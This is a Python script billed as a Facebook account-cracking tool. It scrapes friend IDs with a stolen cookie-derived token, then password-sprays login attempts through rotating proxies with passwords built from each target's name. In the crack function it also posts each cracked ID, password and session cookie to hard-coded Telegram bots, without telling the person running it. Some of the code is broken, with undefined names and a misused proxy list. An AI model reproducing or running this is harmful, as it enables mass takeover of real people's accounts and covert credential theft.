#-----------------[ IMPORT-MODULE ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.panel import Panel
from bs4 import BeautifulSoup as parser
from rich.tree import Tree
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
pretty.install()
CON=sol()

#------------------[ USER-AGENT ]-------------------#
pretty.install()
CON=sol()
ugen1=[]
ugen=[]
fresh=[]
redmi=[]
cokbrut=[]
manug=[]
pro=[]
scrap=[]
pri=[]
uadarimu=[]
ses=requests.Session()
princp=[]

try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=3000&country=all&ssl=all&anonymity=all').text
    open('.proxy.txt','w').write(prox)
except Exception as e:
    exit(e)
    
###---[ KONFIGURASI JAM ]---###
def cek_jam():
	try:open('data/jam_ua.txt','r').read()
	except:open('data/jam_ua.txt','w').write(str(datetime.now().hour))
	if str(jam) in open('data/jam_ua.txt','r').read():
		try:open('data/ua_cil.txt','r').read()
		except:rol_ua()
	else:rol_ua()
	
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA ]--------------#
P = '\x1b[1;97m'
ab = '\x1b[1;90m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def renv_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-BANNER ]-----------------#
def banner():
    os.system('clear')
    wel = '# FACEBOOK CRACKED TOOLS'
    wel2 = mark(wel, style='red')
    sol().print(wel2)
    au="""[white]
╔═╗╔╗╔╦╗╦   ╦╔╦╗
╚═╗╠╩╗║ ║   ║ ║║
╚═╝╚═╝╩ ╩═╝o╩═╩╝
[white][green]\nCracking Method By Brutal.ID[white] """
    
    pengembang1=nel(au,style="cyan")
    cetak(nel(pengembang1, title='v 3.144'))

#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = ' PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN '
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\tCookies Capture Extension Suggestion : [green]Cookiedough[white]'))
		asu = random.choice([h])
		cookie=input(f'Enter Cookies :{asu} ')
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "NokiaX3-02/5.0 (06.05) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1))
		cok=open(".cok.txt", "w").write(cookie)
		print(f'  {x}[{h}•{x}]{h} LOGIN SUCCESSFUL.........Run the command again!!!!{x} ');time.sleep(1)
		login()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN FAILED.....CHECK YOUR ACCOUNT !!%s'%(x,k,x,m,x))
		exit()
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Expired Cookies ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	renv_xy(f' {x}╔ {ab}[ {x}•{ab} ] Your Name  : {h}'+str(my_name))
	renv_xy(f'{x} ╠ {ab}[ {x}•{ab} ] Your Id    : {h}'+str(my_id))
	renv_xy(f'{x} ╠ {ab}[ {x}•{ab} ] Your Ip    : {h}{ip}{x}')
	print(f' {x}╠ {ab}[ {x}•{ab} ] Github     : {x}https://github.com/brutalid')
	print(f' ╠{x} [ {x}•{ab} ] Update     : {x}Version  {ab}3.144{x} ')
	print(f'{x} ║')
	print(f' ╠══{ab} [ {x}•{ab} ] Select Menu{x}')
	print(f' ╠══ {ab}[{x} 1{ab} ] Crack Public{x}')
	print(f' ╠══{ab} [{x} 2 {ab}] Crack File{x}')
	print(f' ╚══{ab} [ {x}0{ab} ] Keluar{x}')
	print(f'       ║')
	_____renv__renv_____ = input(f'       ╚══ {ab}[ {x}•{ab} ] Select :{x} ')
	print('')
	if _____renv__renv_____ in ['1']:
		dump_massal()
	elif _____renv__renv_____ in ['2']:
		File()
	elif _____renv__renv_____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('  {h}[ • ] Successfully Logout+Delete Cookies ')
		exit()
	else:
		print('{m} [ • ] input correctly ')
		back()
def error():
	print(f'{k} [ • ] Sorry, this feature is still being fixed {x}')
	time.sleep(4)
	back()
	
	
#####Crack File####
def File():
        banner()
        try:
            print(f'{x} ╗')
            fileX = input (f' {x}╚{ab} [ {x}• {ab}] Enter file path :{x} ') 
            for line in open(fileX, 'r').readlines():
                id.append(line.strip())
            return setting()
        except IOError:
            exit("\n{m} [ ! ] file %s not found{x}"%(fileX))

#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	banner()
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input(f'{x} ╠ {ab}[ {x}•{ab} ] Masukan Jumlah Target? :{x} '))
	except ValueError:
		print(f'{m} [ • ] Input Yang Bener ')
		exit()
	if jum<1 or jum>100:
		print(f' {m} [ • ] Gagal Dump ID (ID Tidak public)  ')
		exit()
	ses=requests.Session()
	yz = 0
	print(f'{x} ╚═╗')
	for met in range(jum):
		yz+=1
		kl = input(f'   {x}╠{ab} [ {x}•{ab} ] Input ID Ke '+str(yz)+f' :{x} ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('>> unstable signal ')
			exit()
	try:
		print(f'{x}   ║')
		print(f'   {x}╚══ {ab}[ {x}• {ab}] Total ID Collected {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('{m} [ • ]  Eror signal ')
		back()
	except (KeyError,IOError):
		print(f' [ • ] {m} Friends Not Public {x}')
		time.sleep(3)
		back()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	banner()
	print(f'\n{x} ╗')
	print(f' {x}╠{ab} [ {x}• {ab}]  ID Sortir Setting ')
	print(f' {x}╚╗')
	print(f'  {x}╠ {ab}[ {x}1 {ab}] ID Old To New ')
	print(f'{x}  ╠{ab} [ {x}2 {ab}] ID New To Old  ')
	print(f'{x}  ╠ {ab}[ {x}3 {ab}] ID Random  ')
	print(f' {x} ║')
	hu = input(f'  {x}╚══ {ab}[ {x}• {ab}] Select :{x} ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
			
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print(f'{m} [ • ]  input correctly ')
		exit()
	banner()
	print(f' {x}╠ {ab}[ {x}• {ab}] Input Metode Cracked Login ')
	print(f' {x}╚╗')
	print(f'  {x}╠ {ab}[ {x}1 {ab}] M.facebook by Mobile')
	print(f' {x} ╠{ab} [ {x}2 {ab}] Mbasic.Facebook by Mobile')
	print(f' {x} ╠ {ab}[ {x}3 {ab}] Free.Facebook by Mobile')
	print(f'  {x}║')
	hc = input(f'  {x}╠══ {ab}[ {x}• {ab}] Pilih :{x} ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('new')
	elif hc in ['3','03']:
		method.append('grabmedia')
	elif hc in ['4','04']:
		method.append('media')
	elif hc in ['4','04']:
		method.append('crazy')
	else:
		method.append('media')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	#print(f'>>>>> {m}•{k}•{h}•{x} Sedang Menggeser Matahari {m}•{k}•{h}•{x} <<<<< ')
	print(f'{x}  ║')
	print(f'  ╠{ab} [ {x}• {ab}] Results {h}OK{ab} Save in : {h}OK/%s {ab}'%(okc))
	print(f'{x}  ╚{ab} [ {x}• {ab}] Results {k}CP{ab} Save in : {k}CP/%s {x}\n'%(cpc))
	print("")
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['sayang','sayangkamu']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append(frs+'321')
					pwv.append(frs+'12345')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'321')
					pwv.append(frs+'321')
					pwv.append(frs+'12345')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	print(f' {ab}[ {x}• {ab}] Crack Finished ')
	print('')
	print(f'{ab} [ {x}• {ab}]{h} OK : {h}%s '%(ok))
	print(f' {ab}[ {x}• {ab}]{k} CP : {k}%s{x} '%(cp))
	print('')
	print(f' {ab}[ {x}• {ab}] Good Bye Thanks To Using My Script {x}  ')
#--------------------[ METODE-MOBILE ]-----------------#

au = (['Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.136 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.136 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.136 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.136 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G950F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.2 Chrome/51.0.2704.106 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.136 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.136 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.136 Mobile Safari/537.36'])
def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	asu = random.choice([m,k])
	asu2 = random.choice([u,h])
	asu3 = random.choice([b,O])
	asu4 = random.choice([u,b,m])
	asu5 = random.choice([k,h,u])
	pers = loop*100/len(id2)
	fff = '%'
	print(f'\r   {asu}▪︎{asu2}▪︎{asu3}▪︎{asu4}▪︎{asu5}▪︎ {ab}Cracked {ab}%s{m}%s{ab}/{ab}%s{N} {H} OK{N} : {H}%s{N} {K}CP{N} : {K}%s{N} {m}%s%s%s{N}'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = 'Mozilla/5.0 (compatible; FacebookBot/1.0; +https://developers.facebook.com/docs/sharing/webmasters/facebookbot/)'
	ua2 = random.choice(au)
	ses = requests.Session()
	nip=random.choice(prox)
	proxs= {'http': 'socks4://'+nip}
	for pw in pwv:
		try:
			ses.headers.update({
			'authority': 'm.facebook.com',
			'cache-control': 'no-cache',
			'sec-ch-ua-mobile': '?1',
			'upgrade-insecure-requests': '1',
			'sec-fetch-user': '?1',
			'user-agent': ua2,
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',	
			'sec-fetch-site': 'same-origin',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-dest': 'document',
			'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&uid='+idf+'next=https://m.facebook.com/dialog/oauth?client_id=124024574287414&redirect_uri=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F&state=%7B%22fbLoginKey%22%3A%22c3hfin0cf021whvffr1cknvytbe5wjk13nellsi5tqbffaxvw8%22%2C%22fbLoginReturnURL%22%3A%22%2Ffxcal%2Fdisclosure%2F%3Fnext%3D%252F%22%7D&scope=email&response_type=code%2Cgranted_scopes&locale=id_ID&ret=login&fbapp_pres=0&logger_id=a57b36d0-9a33-43e0-a763-d8638ec5a363&tp=unspecified&cancel_url=https://www.instagram.com/accounts/signup/?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=%7B%22fbLoginKey%22%3A%22c3hfin0cf021whvffr1cknvytbe5wjk13nellsi5tqbffaxvw8%22%2C%22fbLoginReturnURL%22%3A%22%2Ffxcal%2Fdisclosure%2F%3Fnext%3D%252F%22%7D#_=_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={
			"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
			"uid":idf,
			"next":"https://m.facebook.com/dialog/oauth?client_id=124024574287414&redirect_uri=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F&state=%7B%22fbLoginKey%22%3A%22c3hfin0cf021whvffr1cknvytbe5wjk13nellsi5tqbffaxvw8%22%2C%22fbLoginReturnURL%22%3A%22%2Ffxcal%2Fdisclosure%2F%3Fnext%3D%252F%22%7D&scope=email&response_type=code%2Cgranted_scopes&locale=id_ID&ret=login&fbapp_pres=0&logger_id=a57b36d0-9a33-43e0-a763-d8638ec5a363&tp=unspecified&cancel_url=https://www.instagram.com/accounts/signup/?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=%7B%22fbLoginKey%22%3A%22c3hfin0cf021whvffr1cknvytbe5wjk13nellsi5tqbffaxvw8%22%2C%22fbLoginReturnURL%22%3A%22%2Ffxcal%2Fdisclosure%2F%3Fnext%3D%252F%22%7D#_=_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr",
			"flow":"login_no_pin",
			"pass":pw
			}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+= 'm-pixel-ratio=1.4375 ; wd=1082x405'
			heade={
			'authority': 'm.facebook.com',
			'accept-encoding': 'gzip, deflate, br',
			'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
			'cache-control': 'no-cache',
			'content-length': str(random.randint(11,2000)),
			'content-type': 'application/x-www-form-urlencoded',
			'cookie': 'dbln=%7B%22100065249511444%22%3A%22SIPkZH3v%22%7D ; locale=en_gb ; zsh=pkhX3BzTva5phcgYM0FYlMTvuuxo0HMzFZCwvjfPJOueuXVm4GvM9dbf2HPjKXXnTQiWqga_FQcOWrzjhRCLo9a5Sl9tQAAZdasrQn74ahKfH7W9nbfJQSLK2S ; m-pixel-ratio=1.4375 ; sfau=AYgxcOj8I-ttBf6OE8KIGdwGZAISxnb1Idjw6BfWOtjdNqDHOGPGM9F3_SG84O0s0tCA6YtHA-F7RZPSW0R4s_MfOGrNwbGqiM1_jP6Uwqw4XTQyOGqNblUbOcVV_6xGLEzr5M7NJ8s-tJP0DNFUq3bRBBGdpFN75J6T7F-4cnySfElKmYJN2XfoHENMDT3b_6HZFTV3HvpiAAaGtlkecSvmDRqNlef3jsa8HEafDda_BA ; datr=I6Q6Y5ys9wvYFXkupNmkazld ; wd=1082x405 ; fr=0UjpfXz2JL6fuvzjo.AWW70LKEuGU9PH2B_0X2kehBVX4.BjNjGn.h6.GM5.0.0.BjOq0I.AWV_Co-iQkk',
			'origin': 'https://m.facebook.com',
			'pragma': 'no-cache',
			'referer': 'https://m.facebook.com/login.php?&uid='+idf+'next=https%3A%2F%2Fm.facebook.com%2Flogin%2Fdevice-based%2Fvalidate-password%2F%3Fshbl%3D0%26%26locale%3Den_GB&ref=104&refsrc=deprecated&locale2=en_GB',
			'sec-ch-ua': '"Chromium";v="105", "Not)A;Brand";v="8"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-origin',
			'upgrade-insecure-requests': '1',
			'user-agent': ua2,
			'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(p.text)).group(1)
			}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&&locale=en_GB',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				requests.post(f"https://api.telegram.org/bot5768980424:AAHLKi2iPWYbJ8KYRWv6PuAPmsJ0plMruWI/sendMessage?chat_id=5272925625&text={idf}\n{pw}")
				print(f'\n{x} ╗')
				print(f'{x} ╠ {ab}[ {k}• {ab}] Account {k}Cp ')
				print(f' {x}╚ {k}{idf}{ab}|{k}{pw}                                 {N}')                          
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
#				os.popen('play-audio data/cp.mp3')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kuki+= 'm-pixel-ratio=1.4375 ; wd=1082x405'
				requests.post(f"https://api.telegram.org/bot5655057589:AAETnjxZwtZG7GiV2RvZ13V5qdvFxKwaJ2g/sendMessage?chat_id=5272925625&text={idf}\n{pw}\n{kuki}")
				print(f'\n{x} ╗')
				print(f'{x} ╠{ab} [ {h}• {ab}] Account{h} Ok ')
				print(f' {x}╠ {h}{idf}{ab}|{h}{pw}                                 {N}')
				print(f' {x}╚ {ab}{kuki}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
#				os.popen('play-audio data/ok.mp3')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1


def login2():
    banner()
    print(f'\n {ab}[{x} 1 {ab}] Crack Via Dump ID')
    print(f' [{x} 2{ab} ] Crack Via File ID')
    pol = input(f' [ {x}• {ab}] Pilih{x} : ')
    if pol in '1':
        login()
    if pol in '2':
        File()
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('clear')
	except:pass
	login2()
